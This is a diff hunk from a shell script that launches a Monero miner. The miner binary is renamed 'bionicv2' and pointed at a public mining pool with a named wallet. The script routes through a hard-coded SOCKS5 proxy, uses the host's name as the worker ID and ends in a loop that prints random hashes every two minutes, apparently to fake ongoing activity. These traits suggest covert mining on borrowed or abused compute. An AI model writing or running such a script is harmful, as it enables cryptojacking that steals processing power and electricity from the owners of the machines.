@@ -10,5 +10,5 @@ wallet="novalanto"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 proxy="socks5://174.138.17.79:4145"
-./bionicv2 -o xmr.hashcity.org:4444 -u novalanto.apa -p x --tls -k --nicehash --coin monero -a rx/0
+./bionicv2 -o xmr.hashcity.org:4444 -u novalanto.apa -p x -a rx/0
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
